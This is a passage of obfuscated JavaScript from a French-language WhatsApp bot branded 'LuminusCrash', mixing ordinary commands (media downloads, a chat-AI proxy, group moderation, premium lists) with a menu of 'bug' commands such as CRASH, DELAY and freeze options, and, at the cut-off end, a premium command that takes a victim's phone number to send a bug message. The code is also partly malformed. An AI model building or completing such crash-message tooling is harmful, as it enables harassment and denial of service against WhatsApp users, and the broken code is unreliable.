𝙽𝙰𝙶𝙸_𝙵𝚁𝙴𝙴𝚉𝙴\nΩ ᴋɪʟʟ\nΩ sᴜsᴘᴇɴsɪᴏɴ\n┗───────────────────\n\n┏──⛣ 𝐒𝐏𝐄𝐂𝐈𝐀𝐋 𝐁𝐔𝐆\nΩ 𝙲𝚁𝙰𝚂𝙷\nΩ 𝙳𝙴𝙻𝙰𝚈\nΩ ᴀʟʟ_ɢʀɪᴍᴍ\nΩ 𝙲𝚁𝙰𝚉𝚈_𝙾𝙵𝙵\n┗───────────────────\n\n┏──⛣ 𝑬𝑴𝑶𝑱𝑰 𝑩𝑼𝑮\nΩ 🕷️\nΩ 🌹\nΩ 👾\nΩ ☠️\nΩ 🦄\n┗──────────────────";
          await _0x4d73c7.sendMessage(_0x22c6f2.chat, {
            'image': {
              'url': "https://files.catbox.moe/giab52.jpeg"
            },
            'caption': _0x31244e,
            'contextInfo': {
              'mentionedJid': [_0x22c6f2.sender],
              'forwardedNewsletterMessageInfo': {
                'newsletterName': "ʟɪᴍᴜʟᴇ{ʰⁱⁿᵘᵍᵉʳᵃ}✔️",
                'newsletterJid': "120363374529648281@newsletter"
              },
              'isForwarded': true,
              'externalAdReply': {
                'showAdAttribution': true,
                'title': "💠ʟᴜᴍɪɴᴜsCʀᴀsʜ💠",
                'mediaType': 0x3,
                'renderLargerThumbnail': false,
                'thumbnailUrl': "https://files.catbox.moe/giab52.jpeg",
                'sourceUrl': "https://whatsapp.com/channel/0029VajBry5FnSzAqZxMhi1i"
              }
            }
          }, {
            'quoted': _0x2be559
          });
        }
        break;
      case "allmenu":
        await _0x4d73c7.sendMessage(_0x42cee0, {
          'react': {
            'text': '📜',
            'key': _0x22c6f2.key
          }
        });
        const _0x5c03ab = "{
conn.sendMessage(m.chat , {
 document: {url: 'https://files.catbox.moe/64z6hb.mp4'},
 mimetype: "application/msword",
 fileName: wmbot, //input nama file
 fileLength: "9999999990000000",
 jpegThumbnail:fs.readFileSync("./all/media/logo.jpg"), //input gambar document
 caption: "Test Button unlimited Kontol", //input caption
 footer: '©2025 - RIMURU HINUGERA', //input footer
contextInfo: {
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: '', //input id ch kalian
newsletterName: `    HINUGERA@`,
serverMessageId: 2
},
	externalAdReply: {
      title: ownername, //input title
      body: '',
      thumbnailUrl: thumbnail, // input thumbnail
      sourceUrl: `https://Tennor.neocities.org`,
      mediaType: 1
      }";
      
        await _0x4d73c7.sendMessage(_0x22c6f2.chat, {
          'image': {
            'url': "https://files.catbox.moe/giab52.jpeg"
          },
          'caption': _0x5c03ab,
          'contextInfo': {
            'mentionedJid': [_0x22c6f2.sender],
            'forwardedNewsletterMessageInfo': {
              'newsletterName': "ʟɪᴍᴜʟᴇ{ʰⁱⁿᵘᵍᵉʳᵃ}✔️",
              'newsletterJid': "120363374529648281@newsletter"
            },
            'isForwarded': true,
            'externalAdReply': {
              'showAdAttribution': true,
              'title': "💠ʟᴜᴍɪɴᴜsCʀᴀsʜ💠",
              'mediaType': 0x3,
              'renderLargerThumbnail': false,
              'thumbnailUrl': "https://files.catbox.moe/giab52.jpeg",
              'sourceUrl': "https://whatsapp.com/channel/0029VajBry5FnSzAqZxMhi1i"
            }
          }
        }, {
          'quoted': _0x2be559
        });
    }
    switch (_0x17f353) {
      case 'hd':
      case "remini":
        {
          await _0x4d73c7.sendMessage(_0x42cee0, {
            'react': {
              'text': '🎗️',
              'key': _0x22c6f2.key
            }
          });
          if (!_0xf08ce7 && !_0x37dcc3) {
            return _0x4d73c7.sendMessage(_0x22c6f2.chat, {
              'text': '' + msg.premium,
              'contextInfo': {
                'mentionedJid': [_0x22c6f2.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': _0x315b9d,
                  'title': "｢ ACCÈS REFUSÉ ｣",
                  'body': "ᑭOᗯᗴᖇ ᗷY ᒪIᗰᑌᒪᗴ ᕼIᑎᑌᘜᗴᖇᗩ",
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x22c6f2
            });
          }
          if (!_0x5c1f4c) {
            return _0x1ab039("*Tu dois répondre à un message image.*");
          }
          if (!/image/.test(_0x29c4eb)) {
            return _0x1ab039("*Send/Reply Photo* " + (_0x232cc0 + _0x17f353));
          }
          _0x1ab039("*La demande est en cours de traitement...👩‍💻*");
          let _0x152a6a = await _0x5c1f4c.download();
          const {
            remini: _0x1fa275
          } = require("./all/remini.js");
          let _0x3755bf = await _0x1fa275(_0x152a6a, "enhance");
          _0x4d73c7.sendMessage(_0x22c6f2.chat, {
            'image': _0x3755bf,
            'caption': "*RÉALISÉE PAR* 💠ʟᴜᴍɪɴᴜsCʀᴀsʜ💠*\n\n> 𝙱𝚈 𝙲𝚁𝙰𝚉𝚈 𝙳𝙴𝚅."
          }, {
            'quoted': _0x22c6f2
          });
        }
        break;
      case "panel":
        {
          if (!_0x1c5e20) {
            return;
          }
          if (!_0xf08ce7) {
            return Reply(msg.owner);
          }
          if (!q) {
            return _0x22c6f2.reply("\n*Exemple d'utilisation :*\nTape *" + _0x42c489 + "* " + "*Services d'installation du panneau*" + "\n");
          }
          let _0x28aab0 = "\n*FOND ENTRANT*✅\n_Votre commande est en cours de traitement_\n📦 *Item*: " + _0xd0eb9a + "\n⏰ " + _0x228092(Date.now()) + "\n\n*Veuillez patienter un instant...*\n\n> 𝙱𝚈 𝙲𝚁𝙰𝚉𝚈 𝙳𝙴𝚅";
          await _0x4d73c7.sendMessage(_0x22c6f2.chat, {
            'text': _0x28aab0,
            'mentions': [_0x22c6f2.sender],
            'contextInfo': {
              'externalAdReply': {
                'title': "Fonds entrant ✅",
                'body': "©Powered by 𝙲𝚁𝙰𝚉𝚈 𝙳𝙴𝚅",
                'thumbnailUrl': "https://files.catbox.moe/giab52.jpeg",
                'sourceUrl': "https://whatsapp.com/channel/0029VajBry5FnSzAqZxMhi1i"
              }
            }
          }, {
            'quoted': null
          });
        }
        break;
      case "tiktok":
      case 'tt':
        {
          if (!_0xf08ce7 && !_0x37dcc3) {
            return _0x1ab039(msg.premium);
          }
          if (!_0xd0eb9a) {
            return _0x1ab039("*Exemple : " + (_0x232cc0 + _0x17f353) + " lien*");
          }
          if (!_0xd0eb9a.includes("tiktok")) {
            return _0x1ab039("*Lien Invalide !*");
          }
          _0x1ab039("*Veuillez patienter...👩‍💻*");
          fetch("https://api.tiklydown.eu.org/api/download/v5?url=" + encodeURIComponent(_0xd0eb9a)).then(_0x97d180 => _0x97d180.json()).then(_0x3d07e1 => {
            if (_0x3d07e1.status !== 0xc8) {
              return _0x1ab039("*Échec de la récupération des données à partir de l'API*");
            }
            const _0x27b1e7 = _0x3d07e1.result.play;
            const _0x2ab665 = _0x3d07e1.result.music;
            _0x4d73c7.sendMessage(_0x22c6f2.chat, {
              'caption': "*Téléchargement réussi bro 👩‍💻*\n\n> ᑭOᗯᗴᖇ ᗷY ᒪIᗰᑌᒪᗴ ᕼIᑎᑌᘜᗴᖇᗩ.",
              'video': {
                'url': _0x27b1e7
              }
            }, {
              'quoted': _0x22c6f2
            });
            _0x4d73c7.sendMessage(_0x22c6f2.chat, {
              'audio': {
                'url': _0x2ab665
              },
              'mimetype': "audio/mp4"
            }, {
              'quoted': _0x2be559
            });
          })["catch"](_0x5dcd60 => _0x1ab039(_0x5dcd60.toString()));
        }
        break;
      case "spotify":
      case "song":
        {
          if (!_0xf08ce7 && !_0x37dcc3) {
            return _0x1ab039(msg.premium);
          }
          const _0x57aff1 = require("axios");
          if (!_0xd0eb9a) {
            return _0x1ab039("*Entrez un exemple de titre*\n*Exemple : " + (_0x232cc0 + _0x17f353) + " Kratos boss*");
          }
          await _0x1ab039("*Veuillez patienter un instant...👩‍💻*");
          try {
            const _0x14ecf2 = "https://spotifyapi.caliphdev.com/api/search/tracks?q=" + encodeURIComponent(_0xd0eb9a);
            const _0x568907 = (await _0x57aff1.get(_0x14ecf2)).data;
            const _0x26f523 = _0x568907[0x0];
            if (!_0x26f523) {
              return _0x1ab039("*Chanson non trouvée.*");
            }
            const _0x282735 = "*👩‍💻 RECHERCHE SPOTIFY 👩‍💻*\n\n- *Titre :* " + _0x26f523.title + "\n- *Artiste :* " + _0x26f523.artist + "\n- *URL :* " + _0x26f523.url + "\n\n> BY 𝑙𝑖𝑚𝑢𝑙𝑒 ℎ𝑖𝑛𝑢𝑔𝑒𝑟𝑎";
            await _0x4d73c7.sendMessage(_0x22c6f2.chat, {
              'text': '' + _0x282735,
              'contextInfo': {
                'mentionedJid': [_0x22c6f2.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'title': '' + _0x26f523.title,
                  'body': "RECHERCHE ET TÉLÉCHARGEMENT SPOTIFY",
                  'thumbnailUrl': _0x26f523.thumbnail,
                  'mediaType': 0x1,
                  'renderLargerThumbnail': true
                }
              }
            }, {
              'quoted': _0x2be559
            });
            const _0x42da4b = "https://spotifyapi.caliphdev.com/api/download/track?url=" + encodeURIComponent(_0x26f523.url);
            let _0x3df73a = await fetch(_0x42da4b);
            if (_0x3df73a.headers.get("content-type") === "audio/mpeg") {
              await _0x4d73c7.sendMessage(_0x22c6f2.chat, {
                'audio': {
                  'url': _0x42da4b
                },
                'mimetype': "audio/mpeg"
              }, {
                'quoted': _0x2be559
              });
            } else {
              _0x22c6f2.reply("*Impossible d'obtenir le fichier audio.*");
            }
          } catch (_0x43452e) {
            console.error(_0x43452e);
            _0x22c6f2.reply("*Une erreur s'est produite lors de la récupération du fichier audio.*");
          }
        }
        break;
      case "crazy":
        {
          if (!_0xf08ce7 && !_0x37dcc3) {
            return _0x1ab039(msg.premium);
          }
          await _0x4d73c7.sendMessage(_0x42cee0, {
            'react': {
              'text': '🤖',
              'key': _0x22c6f2.key
            }
          });
          if (!_0xd0eb9a) {
            return _0x22c6f2.reply("*Bonjour, comment puis-je vous aider ?*");
          }
          async function _0x1ac14d(_0x28ecae, _0x2260e1) {
            let _0x22bb7f = await axios.post("https://chateverywhere.app/api/chat/", {
              'model': {
                'id': "gpt-4",
                'name': 'GPT-4',
                'maxLength': 0x7d00,
                'tokenLimit': 0x1f40,
                'completionTokenLimit': 0x1388,
                'deploymentName': "gpt-4"
              },
              'messages': [{
                'pluginId': null,
                'content': _0x28ecae,
                'role': 'user'
              }],
              'prompt': _0x2260e1,
              'temperature': 0.5
            }, {
              'headers': {
                'Accept': "/*/",
                'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
              }
            });
            let _0x1d90d1 = _0x22bb7f.data;
            return _0x1d90d1;
          }
          let _0xfe36c1 = await _0x1ac14d(_0xd0eb9a, "*Vous vous appelez Crazy, et moi je suis David, une intelligence artificielle qui aide souvent les autres s'ils ont des questions.*");
          _0x22c6f2.reply(_0xfe36c1);
        }
        break;
      case "public":
        {
          if (!_0xf08ce7) {
            return _0x4d73c7.sendMessage(_0x22c6f2.chat, {
              'text': '' + msg.owner,
              'contextInfo': {
                'mentionedJid': [_0x22c6f2.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': _0x315b9d,
                  'title': "｢ ACCÈS REFUSÉ ｣",
                  'body': "ᑭOᗯᗴᖇ ᗷY ᒪIᗰᑌᒪᗴ ᕼIᑎᑌᘜᗴᖇᗩ",
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x22c6f2
            });
          }
          _0x4d73c7["public"] = true;
          _0x1ab039("*Le 𝙱𝙾𝚃 a été modifié avec succès sur* `𝗣𝗨𝗕𝗟𝗜𝗖`");
        }
        break;
      case "self":
        {
          if (!_0xf08ce7) {
            return _0x4d73c7.sendMessage(_0x22c6f2.chat, {
              'text': '' + msg.owner,
              'contextInfo': {
                'mentionedJid': [_0x22c6f2.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': _0x315b9d,
                  'title': "｢ ACCÈS REFUSÉ ｣",
                  'body': "ᑭOᗯᗴᖇ ᗷY ᒪIᗰᑌᒪᗴ ᕼIᑎᑌᘜᗴᖇᗩ",
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x22c6f2
            });
          }
          _0x4d73c7["public"] = false;
          _0x1ab039("*Le mode 𝙱𝙾𝚃 a été modifié avec succès sur* `𝗦𝗘𝗟𝗙`");
        }
        break;
      case "owner":
        {
          _0x4d73c7.sendContact(_0x22c6f2.chat, [owner], "𝗗𝗲́𝘃𝗲𝗹𝗼𝗽𝗽𝗲𝘂𝗿 𝗱𝗲𝘀 𝗯𝗼𝘁𝘀 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 𝗲𝘁 𝗮𝘂𝘁𝗿𝗲𝘀.👩‍💻", null, {
            'contextInfo': {
              'mentionedJid': [_0x22c6f2.sender],
              'externalAdReply': {
                'showAdAttribution': true,
                'thumbnail': "https://i.postimg.cc/CKxKphwT/Picsart-25-02-12-20-56-56-213.jpg",
                'title': "🌟Droits d'auteur " + global.namabot,
                'renderLargerThumbnail': true,
                'sourceUrl': "https://whatsapp.com/channel/0029VajBry5FnSzAqZxMhi1i",
                'mediaType': 0x1
              }
            }
          });
        }
        break;
      case "addprem":
        {
          if (!_0xf08ce7) {
            return _0x1ab039("*owner seulement.⛓️*");
          }
          if (!_0xa2f393[0x0]) {
            return _0x1ab039("*Usage " + (_0x232cc0 + _0x17f353) + " + numero*\n\n*Exemple " + (_0x232cc0 + _0x17f353) + " 241xxx*");
          }
          let _0x1a8494 = q.split('|')[0x0].replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          let _0x9f6966 = await _0x4d73c7.onWhatsApp(_0x1a8494);
          if (_0x9f6966.length == 0x0) {
            return _0x1ab039("*Entrez un numéro valide et enregistré sur WhatsApp !🤦*");
          }
          _0x32b479.push(_0x1a8494);
          fs.writeFileSync("./all/database/premium.json", JSON.stringify(_0x32b479));
          _0x22c6f2.reply("*Ajout avec succès " + _0x1a8494 + " sur la liste Premium !*\n\n> ᑭOᗯᗴᖇ ᗷY ᒪIᗰᑌᒪᗴ ᕼIᑎᑌᘜᗴᖇᗩ");
        }
        break;
      case "delprem":
        {
          if (!_0xf08ce7) {
            return _0x1ab039("*Mr Kévin Tsh seulement.⛓️*");
          }
          if (!_0xa2f393[0x0]) {
            return _0x22c6f2.reply("*Usage " + (_0x232cc0 + _0x17f353) + " + numero*\n\n*Exemple " + (_0x232cc0 + _0x17f353) + " 241xxx*");
          }
          let _0x3af3e0 = q.split('|')[0x0].replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          unp = _0x32b479.indexOf(_0x3af3e0);
          _0x32b479.splice(unp, 0x1);
          fs.writeFileSync("./all/database/premium.json", JSON.stringify(_0x32b479));
          _0x1ab039("*Supprimé avec succès " + _0x3af3e0 + " De la liste Premium !*\n\n> ᑭOᗯᗴᖇ ᗷY ᒪIᗰᑌᒪᗴ ᕼIᑎᑌᘜᗴᖇᗩ.");
        }
        break;
      case "addowner":
        {
          if (!_0xf08ce7) {
            return _0x1ab039(msg.owner);
          }
          if (!_0xa2f393[0x0]) {
            return _0x1ab039("*Usage " + (_0x232cc0 + _0x17f353) + " + numéro*\n\n*Exemple " + (_0x232cc0 + _0x17f353) + '*');
          }
          prem1 = _0xd0eb9a.split('|')[0x0].replace(/[^0-9]/g, '');
          let _0x457c4d = await _0x4d73c7.onWhatsApp(prem1 + "@s.whatsapp.net");
          if (_0x457c4d.length == 0x0) {
            return "*Entrez un numéro valide et enregistré sur WhatsApp !🤦*";
          }
          _0x3f886c.push(prem1);
          fs.writeFileSync("./all/database/owner.json", JSON.stringify(_0x3f886c));
          _0x1ab039(prem1 + " *Déjà Owner !*");
          _0x4d73c7.sendMessage(prem1 + "@s.whatsapp.net", {
            'image': {
              'url': "https://files.catbox.moe/giab52.jpeg"
            },
            'caption': "*Vous êtes désormais le copropriétaire du bot*\n\n> ᑭOᗯᗴᖇ ᗷY ᒪIᗰᑌᒪᗴ ᕼIᑎᑌᘜᗴᖇᗩ."
          }, {
            'quoted': _0x2be559
          });
        }
        break;
      case "addgc":
        if (!_0xf08ce7) {
          return _0x1ab039("*Désolé, cette commande est réservée aux propriétaires uniquement.👷*");
        }
        if (!_0x4fe88d) {
          return _0x22c6f2.reply("*Propriétaire seulement.*");
        }
        _0x30b9ea.push(_0x22c6f2.chat);
        fs.writeFileSync("./all/database/idgrup.json", JSON.stringify(_0x30b9ea));
        _0x22c6f2.reply('*' + _0x17f353 + " Panneau actif pour créer*");
        break;
      case "kick":
        {
          if (!_0x4fe88d) {
            return _0x4d73c7.sendMessage(_0x22c6f2.chat, {
              'text': '' + msg.group,
              'contextInfo': {
                'mentionedJid': [_0x22c6f2.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': _0x315b9d,
                  'title': "｢ ACCÈS REFUSÉ ｣",
                  'body': "ᑭOᗯᗴᖇ ᗷY ᒪIᗰᑌᒪᗴ ᕼIᑎᑌᘜᗴᖇᗩ",
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x22c6f2
            });
          }
          if (!_0xc42364) {
            return _0x4d73c7.sendMessage(_0x22c6f2.chat, {
              'text': '' + msg.adminbot,
              'contextInfo': {
                'mentionedJid': [_0x22c6f2.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': _0x315b9d,
                  'title': "｢ ACCÈS REFUSÉ ｣",
                  'body': "ᑭOᗯᗴᖇ ᗷY ᒪIᗰᑌᒪᗴ ᕼIᑎᑌᘜᗴᖇᗩ",
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x22c6f2
            });
          }
          if (!_0x48f380 && !_0xf08ce7) {
            return _0x4d73c7.sendMessage(_0x22c6f2.chat, {
              'text': '' + msg.admin,
              'contextInfo': {
                'mentionedJid': [_0x22c6f2.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': _0x315b9d,
                  'title': "｢ ACCÈS REFUSÉ ｣",
                  'body': "ᑭOᗯᗴᖇ ᗷY ᒪIᗰᑌᒪᗴ ᕼIᑎᑌᘜᗴᖇᗩ",
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x22c6f2
            });
          }
          if (_0xd0eb9a || _0x22c6f2.quoted) {
            let _0x2ef7ba = _0x22c6f2.mentionedJid[0x0] ? _0x22c6f2.mentionedJid[0x0] : _0x22c6f2.quoted ? _0x22c6f2.quoted.sender : _0xd0eb9a.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
            await _0x4d73c7.groupParticipantsUpdate(_0x22c6f2.chat, [_0x2ef7ba], "remove").then(_0x519af9 => _0x4d73c7.sendMessage(_0x22c6f2.chat, {
              'text': "*Retiré•e  avec succès* @" + _0x2ef7ba.split('@')[0x0],
              'mentions': ['' + _0x2ef7ba]
            }, {
              'quoted': _0x22c6f2
            }))['catch'](_0x19cbac => _0x1ab039(_0x19cbac.toString()));
          } else {
            return _0x1ab039("\n*Exemple d'utilisation :*\nTape *" + _0x42c489 + "* " + "241xxx/@tag" + "\n");
          }
        }
        break;
      case "hidetag":
      case 'ht':
        {
          if (!_0xf08ce7) {
            return _0x4d73c7.sendMessage(_0x22c6f2.chat, {
              'text': '' + msg.owner,
              'contextInfo': {
                'mentionedJid': [_0x22c6f2.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': _0x315b9d,
                  'title': "｢ ACCÈS REFUSÉ ｣",
                  'body': "ᑭOᗯᗴᖇ ᗷY ᒪIᗰᑌᒪᗴ ᕼIᑎᑌᘜᗴᖇᗩ",
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x22c6f2
            });
          }
          if (!_0x48f380 && !_0xf08ce7) {
            return _0x4d73c7.sendMessage(_0x22c6f2.chat, {
              'text': '' + msg.admin,
              'contextInfo': {
                'mentionedJid': [_0x22c6f2.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': _0x315b9d,
                  'title': "｢ ACCÈS REFUSÉ ｣",
                  'body': "ᑭOᗯᗴᖇ ᗷY ᒪIᗰᑌᒪᗴ ᕼIᑎᑌᘜᗴᖇᗩ",
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x22c6f2
            });
          }
          if (!_0x22c6f2.quoted && !_0xd0eb9a) {
            return _0x1ab039("\n*Exemple d'utilisation :*\nTape *" + _0x42c489 + "* " + "*Le text à annoncer ?*" + "\n");
          }
          var _0x21726b = _0x22c6f2.quoted ? _0x22c6f2.quoted.text : _0xd0eb9a;
          var _0x59655b = await _0x88eb25.participants.map(_0x39df2d => _0x39df2d.id);
          _0x4d73c7.sendMessage(_0x22c6f2.chat, {
            'text': _0x21726b,
            'mentions': [..._0x59655b]
          });
        }
        break;
      case "tagall":
      case "tag":
        {
          if (!_0xf08ce7) {
            return _0x4d73c7.sendMessage(_0x22c6f2.chat, {
              'text': '' + msg.owner,
              'contextInfo': {
                'mentionedJid': [_0x22c6f2.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': _0x315b9d,
                  'title': "｢ ACCÈS REFUSÉ ｣",
                  'body': "ᑭOᗯᗴᖇ ᗷY ᒪIᗰᑌᒪᗴ ᕼIᑎᑌᘜᗴᖇᗩ",
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x22c6f2
            });
          }
          if (!_0x48f380 && !_0xf08ce7) {
            return _0x4d73c7.sendMessage(_0x22c6f2.chat, {
              'text': '' + msg.admin,
              'contextInfo': {
                'mentionedJid': [_0x22c6f2.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': _0x315b9d,
                  'title': "｢ ACCÈS REFUSÉ ｣",
                  'body': "ᑭOᗯᗴᖇ ᗷY ᒪIᗰᑌᒪᗴ ᕼIᑎᑌᘜᗴᖇᗩ",
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x22c6f2
            });
          }
          if (!_0xd0eb9a) {
            return _0x1ab039("\n*Exemple d'utilisation :*\nTape *" + _0x42c489 + "* " + "*Le message ?*" + "\n");
          }
          var _0x59655b = await _0x88eb25.participants.map(_0x1d8d7f => _0x1d8d7f.id);
          var _0x21726b = " " + _0xd0eb9a + "\n\n";
          _0x59655b.forEach(_0x602a8e => _0x602a8e !== _0x22c6f2.sender ? _0x21726b += '@' + _0x602a8e.split('@')[0x0] + "\n" : '');
          _0x4d73c7.sendMessage(_0x22c6f2.chat, {
            'text': _0x21726b,
            'mentions': [..._0x59655b]
          });
        }
        break;
      case 'close':
        {
          if (!_0x4fe88d) {
            return _0x1ab039("*Chat de groupe seulement*");
          }
          if (!_0xf08ce7) {
            return _0x4d73c7.sendMessage(_0x22c6f2.chat, {
              'text': '' + msg.owner,
              'contextInfo': {
                'mentionedJid': [_0x22c6f2.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': _0x315b9d,
                  'title': "｢ ACCÈS REFUSÉ ｣",
                  'body': "ᑭOᗯᗴᖇ ᗷY ᒪIᗰᑌᒪᗴ ᕼIᑎᑌᘜᗴᖇᗩ",
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x22c6f2
            });
          }
          if (!_0x48f380) {
            return _0x1ab039("*Administrateur uniquement.*");
          }
          if (!_0xc42364) {
            return _0x1ab039("*Kratos doit être administrateur.*");
          }
          var _0x32b7b4 = _0x22c6f2.participant;
          _0x4d73c7.groupSettingUpdate(_0x22c6f2.chat, "*Annonce*");
          _0x1ab039("*Le groupe est temporairement fermé par l'administrateur*\n*Le groupe sera ouvert plus tard.*");
        }
        break;
      case 'open':
        {
          if (!_0x4fe88d) {
            return _0x1ab039("*Chat de groupe seulement*");
          }
          if (!_0xf08ce7) {
            return _0x4d73c7.sendMessage(_0x22c6f2.chat, {
              'text': '' + msg.owner,
              'contextInfo': {
                'mentionedJid': [_0x22c6f2.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': _0x315b9d,
                  'title': "｢ ACCÈS REFUSÉ ｣",
                  'body': "ᑭOᗯᗴᖇ ᗷY ᒪIᗰᑌᒪᗴ ᕼIᑎᑌᘜᗴᖇᗩ",
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x22c6f2
            });
          }
          if (!_0x48f380) {
            return _0x1ab039("*Administrateur uniquement.*");
          }
          if (!_0xc42364) {
            return _0x1ab039("*le bot doit être administrateur.*");
          }
          var _0x32b7b4 = _0x22c6f2.participant;
          _0x4d73c7.groupSettingUpdate(_0x22c6f2.chat, "*Pas d'annonce*");
          _0x1ab039("*Le groupe est désormais ouvert, tous les participants peuvent envoyer des messages.*");
        }
        break;
      case "sound1":
      case "sound2":
      case "sound3":
      case "sound4":
      case "sound5":
      case "sound6":
      case "sound7":
      case "sound8":
      case "sound9":
      case "sound10":
      case "sound11":
      case "sound12":
      case "sound13":
      case "sound14":
      case "sound15":
      case "sound16":
      case "sound17":
      case "sound18":
      case "sound19":
      case "sound20":
      case "sound21":
      case "sound22":
      case "sound23":
      case "sound24":
      case "sound25":
      case "sound26":
      case "sound27":
      case "sound28":
      case "sound29":
      case "sound30":
      case "sound31":
      case "sound32":
      case "sound33":
      case "sound34":
      case "sound35":
      case "sound36":
      case "sound37":
      case "sound38":
      case "sound39":
      case "sound40":
      case "sound41":
      case "sound42":
      case "sound43":
      case "sound44":
      case "sound45":
      case "sound46":
      case "sound47":
      case "sound48":
      case "sound49":
      case "sound50":
      case "sound51":
      case "sound52":
      case "sound53":
      case "sound54":
      case "sound55":
      case "sound56":
      case "sound57":
      case "sound58":
      case "sound59":
      case "sound60":
      case "sound61":
      case "sound62":
      case "sound63":
      case "sound64":
      case "sound65":
      case "sound66":
      case "sound67":
      case "sound68":
      case "sound69":
      case "sound70":
      case "sound71":
      case "sound72":
      case "sound73":
      case "sound74":
      case "sound75":
      case "sound76":
      case "sound77":
      case "sound78":
      case "sound79":
      case "sound80":
      case "sound81":
      case "sound82":
      case "sound83":
      case "sound84":
      case "sound85":
      case "sound86":
      case "sound87":
      case "sound88":
      case "sound89":
      case "sound90":
      case "sound91":
      case "sound92":
      case "sound93":
      case "sound94":
      case "sound95":
      case "sound96":
      case "sound97":
      case "sound98":
      case "sound99":
      case "sound100":
      case "sound101":
      case "sound102":
      case "sound103":
      case "sound104":
      case "sound105":
      case "sound106":
      case "sound107":
      case "sound108":
      case "sound109":
      case "sound110":
      case "sound111":
      case "sound112":
      case "sound113":
      case "sound114":
      case "sound115":
      case "sound116":
      case "sound117":
      case "sound118":
      case "sound119":
      case "sound120":
      case "sound121":
      case "sound122":
      case "sound123":
      case "sound124":
      case "sound125":
      case "sound126":
      case "sound127":
      case "sound128":
      case "sound129":
      case "sound130":
      case "sound131":
      case "sound132":
      case "sound133":
      case "sound134":
      case "sound135":
      case "sound136":
      case "sound137":
      case "sound138":
      case "sound139":
      case "sound140":
      case "sound141":
      case "sound142":
      case "sound143":
      case "sound144":
      case "sound145":
      case "sound146":
      case "sound147":
      case "sound148":
      case "sound149":
      case "sound150":
      case "sound151":
      case "sound152":
      case "sound153":
      case "sound154":
      case "sound155":
      case "sound156":
      case "sound157":
      case "sound158":
      case "sound159":
      case "sound160":
      case "sound161":
        {
          koi = await _0xfcc587("https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/" + _0x17f353 + ".mp3");
          await _0x4d73c7.sendMessage(_0x22c6f2.chat, {
            'audio': koi,
            'mimetype': "audio/mp4",
            'ptt': true
          }, {
            'quoted': _0x22c6f2
          });
        }
        break;
      case 'sc':
      case "script":
        _0x1ab039("\n*Salut mec* @" + _0x22c6f2.sender.split('@')[0x0] + " 👋\n*Le script de 💠ʟᴜᴍɪɴᴜsCʀᴀsʜ💠 se trouve sur notre chaîne WhatsApp, veuillez télécharger le Script pour profiter de l'expérience du Bot.✨*\n\n> *Lien de téléchargement :* https://whatsapp.com/channel/0029VajBry5FnSzAqZxMhi1i\n\n> ᑭOᗯᗴᖇ ᗷY ᒪIᗰᑌᒪᗴ ᕼIᑎᑌᘜᗴᖇᗩ*");
        break;
      case "credit":
        {
          await _0x4d73c7.sendMessage(_0x42cee0, {
            'react': {
              'text': '🍓',
              'key': _0x22c6f2.key
            }
          });
          await _0x4d73c7.sendMessage(_0x22c6f2.chat, {
            'image': {
              'url': "https://files.catbox.moe/giab52.jpeg"
            },
            'caption': "*Ce bot a été créé par moi-même 𝙲𝚁𝙰𝚉𝚈 𝙳𝙴𝚅.*\n\n*Merci de me donner un crédit pour m'encourager...*\n\n*Numéro : +24165730123 pour tout don d'encouragement. Merci !*",
            'contextInfo': {
              'mentionedJid': [_0x22c6f2.sender],
              'forwardedNewsletterMessageInfo': {
                'newsletterName': "ʟɪᴍᴜʟᴇ{ʰⁱⁿᵘᵍᵉʳᵃ}✔️",
                'newsletterJid': "120363374529648281@newsletter"
              },
              'isForwarded': true,
              'externalAdReply': {
                'showAdAttribution': true,
                'title': "💠ʟᴜᴍɪɴᴜsCʀᴀsʜ💠",
                'mediaType': 0x3,
                'renderLargerThumbnail': false,
                'thumbnailUrl': "https://files.catbox.moe/giab52.jpeg",
                'sourceUrl': "https://whatsapp.com/channel/0029VajBry5FnSzAqZxMhi1i"
              }
            }
          }, {
            'quoted': _0x2be559
          });
        }
        break;
      case "crazy":
      case "juice":
        {
          if (!_0x1c5e20) {
            return;
          }
          if (!_0xf08ce7 && !_0x37dcc3) {
            return _0x1ab039(msg.premium);
          }
          if (!q) {
            return _0x1ab039("*Exemple :* " + (_0x232cc0 + _0x17f353) + " 241×××");
          }
          await _0x1ab039(mess.sendbug);
          let _0x38ce32 = q.replace(/[^0-9]/g, '');
